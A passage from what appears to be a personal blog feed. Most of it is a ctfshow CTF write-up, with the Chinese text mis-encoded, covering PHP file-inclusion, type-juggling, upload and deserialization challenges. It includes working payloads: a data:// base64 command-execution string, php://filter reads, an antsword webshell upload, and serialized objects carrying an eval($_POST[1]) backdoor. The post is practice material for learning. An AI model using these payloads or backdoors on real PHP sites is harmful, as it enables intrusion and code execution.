class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œå è®¿é—®2.phpå°±å¯ä»¥å¾—åˆ°flagäº†</p>
<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿‡æ»¤äº†phpä½†æ˜¯æ²¡è¿‡æ»¤å†’å· æ‰€ä»¥å¯ä»¥ç”¨dataä¼ªåè®®+base64ç»•è¿‡<br>æ³¨æ„è¿‡æ»¤äº†ç­‰å·å’ŒåŠ å· æ…¢æ…¢è°ƒå­—ç¬¦å’Œä¸ªæ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac *.php&#x27;</span>);<span class="keyword">echo</span> <span class="string">&#x27;abcd&#x27;</span>;<span class="meta">?&gt;</span>aa</span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvICdhYmNkJzs/PmFh</span></span><br></pre></td></tr></table></figure>

<h1 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥äº†ä¸€æ‰‹intval å‘ç°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç‚¹<br>å…³äºè¿”å›å€¼  <code>æˆåŠŸæ—¶è¿”å› var çš„ integer å€¼ï¼Œå¤±è´¥æ—¶è¿”å› 0ã€‚ ç©ºçš„ array è¿”å› 0ï¼Œéç©ºçš„ array è¿”å› 1ã€‚</code><br>é‚£ä¹ˆæˆ‘ä»¬ä¼ ä¸€ä¸ªéç©ºæ•°ç»„å°±èƒ½ç»•è¿‡äº†<br><code>/?num[]=a</code></p>
<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨phpç‰¹æ€§ ä¼ å…¥ 4476aä¹Ÿä¼šè¢«è§£æä¸º4476<br><code>/?num=4476a</code></p>
<h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æŸ¥äº†æŸ¥ å¸¦ä¸Šmä¿®é¥°ç¬¦ååŒ¹é…çš„æ˜¯å¤šè¡Œ<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¢è¡Œç¬¦æ¥ç»•è¿‡<br><code>/cmd=%0aphp</code></p>
<h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>è¿™é¢˜å’Œweb90çš„åŒºåˆ«åœ¨äºè¿™é‡Œçš„ $num&#x3D;&#x3D;4476 æ˜¯å¼±ç±»å‹æ¯”è¾ƒ<br>æ‰€ä»¥ä¼  4476aç»•ä¸è¿‡<br>æˆ‘çš„åšæ³•æ˜¯ ä¼ ç§‘å­¦è®¡æ•°æ³•<br><code>/?num=4476e1</code><br>è¿™æ ·å°±èƒ½ç»•è¿‡äº†</p>
<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¿˜è¿‡æ»¤äº†å­—æ¯<br>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</p>
<ul>
<li>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</li>
<li>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</li>
<li>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬ä»¥0å¼€å¤´ è½¬æ¢ä¸º8è¿›åˆ¶å³å¯ 010574<br><code>/?num=010574</code></p>
<h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜æˆ‘çš„åšæ³•æ˜¯ç”¨ %0a ç»•è¿‡strposçš„é™åˆ¶<br><code>/?num=%0a010574</code><br>è·Ÿç€é¢˜ç›®hintè¿˜å­¦ä¹ åˆ°äº†ä¸€ç§å§¿åŠ¿:<br>ä¸ç”¨è¿›åˆ¶ ç”¨å°æ•°ç»•è¿‡<br><code>/?num=4476.0</code></p>
<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒæŠŠå°æ•°ç‚¹ä¹Ÿè¿‡æ»¤æ‰äº†<br>è¿™é‡Œç”±äºå¿…é¡»è¦å‡ºç°0ä¸”0ä¸èƒ½åœ¨é¦–ä½<br>æˆ‘ä»¬åªèƒ½åœ¨8è¿›åˆ¶çš„010574å‰å°è¯•åŠ ç‰¹æ®Šå­—ç¬¦<br>å°è¯•åˆ° ç©ºæ ¼å’Œ+çš„æ—¶å€™å‘ç°å¯ä»¥ç»•è¿‡<br><code>/?num= 010574 or /?num= 010574</code><br>è¿™é‡Œå°±åšä¸ªå°ç§¯ç´¯å§</p>
<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™ è§†é¢‘ç»™äº†ä¸€ç§åšæ³• ç›´æ¥ä¼ <br><code>?u=./flag.php</code><br>æˆ–è€…ä¹Ÿå¯ä»¥ç”¨ä¼ªåè®®æ¥è¯»<br><code>?u=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>ç»å…¸ç±»å‹äº†<br>ç¬¬ä¸€ä¸ªæ˜¯å¼±æ¯”è¾ƒ ç¬¬äºŒä¸ªæ˜¯å¼ºæ¯”è¾ƒ<br>POSTä¸Šä¼  <code>a[]=1&amp;b[]=2</code> å³å¯</p>
<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>ä¸Šä¼ å›¾ç‰‡ å°è¯•bpæŠ“åŒ…å‘ç°åœ¨æŠ“åŒ…ä¹‹å‰å°±æ ¡éªŒäº†<br>è¯´æ˜æ˜¯å‰å°æ ¡éªŒ<br>æŸ¥çœ‹æºä»£ç  æ‰¾åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;png&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>æŠŠextsé‡Œé¢çš„æ”¹ä¸ºphpå³å¯ä¸Šä¼ æˆåŠŸ<br>antswordè¿æ¥å³å¯æ‰¾åˆ°flag.php</p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>è¿™é‡Œåœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸ŠåŠ äº†åç«¯éªŒè¯<br>å°†conten-type æ”¹ä¸º  <code>image/png</code> å³å¯ç»•è¿‡<br>è¿™é‡Œæ”¹ä¸ºä»¥å‰å¸¸ç”¨çš„ <code>image/jpeg</code> ä¸è¡Œ  (çŒœæ˜¯å› ä¸ºextsé™åˆ¶ä¸ºäº†png?)<br>antswordè¿æ¥æˆ–æ˜¯è¿›å…¥phpé¡µé¢POSTéƒ½å¯ä»¥å¾—åˆ°flag</p>
<h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>è¿™ åŸæ¥username å’Œ password å°±æ˜¯ <code>xxxxxx</code> ğŸ¤£<br>é‚£ç›´æ¥ä¼ å³å¯</p>
<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>cookieä¸­ä¼  <code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code><br>æ³¨æ„è¿™é‡Œè¦å°†åºåˆ—åŒ–çš„urlencodeä¸€ä¸‹<br>GETä¼  <code>/?username=xxxxxx&amp;password=xxxxxx</code></p>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>æŠŠusernameå’Œpasswordæ”¹æˆä¸ä¸€æ ·å³å¯</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>è¿™æ ·æ„é€ å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user = </span><br><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>ä¼ è¿™ç§åé—¨åç»­æ“ä½œæ–¹ä¾¿ç‚¹</p>
<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>é¢˜ç›®å¤šåŠ äº†ä¸€ä¸ªè¿‡æ»¤é™åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>çœ‹è§†é¢‘å­¦åˆ°å¯ä»¥åœ¨Oåé¢çš„æ•°å­—å‰é¢åŠ ä¸Šâ€™+â€™æ¥ç»•è¿‡è¿™ä¸ªåŒ¹é…</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:+<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxy&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:+<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;&#125;;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>12.6 Birthday-For-Ulganoy</title>
    <url>/2023/12/05/12-6-Birthday-For-Ulganoy/</url>
    <content><![CDATA[<p>20å²ç”Ÿæ—¥ğŸ‚</p>
<span id="more"></span>
<p>ç¬‘æ­» æ˜å¤©æŠŠæ¦‚ç‡ç»Ÿè®¡å­¦å¥½å°±æ˜¯æœ€å¥½çš„åº†ç”Ÿ(ğŸ¤£)ï¼</p>
<p>è¾—è½¬è®¸ä¹… ç»ˆäºèƒ½ä¸€æ­¥æ­¥å‘è‡ªå·±çš„ç›®æ ‡è¿ˆè¿›äº†ï¼<br>è™½ç„¶å­¦æ ¡çš„è¯¾å¾ˆsbâ€¦ ä½†å¯ä»¥è‡ªå­¦å¥½å¤šå¥½å¤šæœ‰è¶£çš„å†…å®¹ï¼<br>CTFæ˜¯ä»¥ç»ƒä¿ƒå­¦çš„æ‰‹æ®µ è¶ç°åœ¨è¿˜æœ‰ç²¾åŠ›çš„æ—¶å€™å¤šå­¦ç‚¹<br>web pwn reverse crypto éƒ½é‚£ä¹ˆçš„æœ‰æ„æ€å•Šï¼<br>web&#x2F;pwnè‡ªä¸å¿…è¯´(HackerDesu<em>â˜…,Â°</em>:.â˜†(ï¿£â–½ï¿£)&#x2F;$:<em>.Â°â˜…</em> ã€‚)<br>reverse<del>æ¯•ç«Ÿæˆ‘æ˜¯è¦è§£åŒ…ä¸‡åé•œ</del>ä¹Ÿè¦å­¦å¥½<br>cryptoå¯ä»¥å¾ˆå¥½çš„ä¿ƒè¿›æ•°å­¦çš„å­¦ä¹ å’Œé”»ç‚¼æ€ç»´èƒ½åŠ›<br>åŠªåŠ›è‡ªæˆ‘æå‡å§ï¼ï¼ï¼é ‘å¼µã‚‹ï¼</p>
<p>è¿™ä¸€å¹´è¿˜å…¥å‘äº†äºŒæ¬¡å…ƒâ€¦ äºŒæ¬¡å…ƒç»™æˆ‘å¸¦æ¥äº†å¥½å¤šå¥½å¤šç¾å¥½çš„ä¸œè¥¿å•Š<br>ä»JoJo6å¼€å§‹åˆ°äº¬å¹ ç‚¹å…” å®‰å²›â€¦ å¤ªå¤šç¾å¥½å›å¿†äº†~<br>åœ¨è¿™é‡Œç«‹ä¸ªflag: å¤§ä¸‰æš‘å‡(maybe)å»æ—¥æœ¬å¥½å¥½é€›é€› å®‡æ²»å¸‚ å¤§å‰å±± äº¬é˜¿å°¼ èŠ³æ–‡ç¤¾â€¦<br>æœŸå¾…æ˜å¹´å››æœˆçš„äº¬å¹ï¼</p>
<p>Kitauji Fightooooo!</p>
]]></content>
  </entry>
  <entry>
    <title>ISCTF2023</title>
    <url>/2023/12/08/ISCTF2023/</url>
    <content><![CDATA[<p>æ²¡æœ‰å…¨éƒ¨è®°å½•<br>Cryptoå’ŒReverseè®°å½•çš„èµ›æ—¶æ²¡åšå‡ºæ¥çš„é¢˜ å…¶ä»–æ˜¯ä½œä¸ºæ–°æ‰‹å­¦ä¹ è®°å½•</p>
<span id="more"></span>
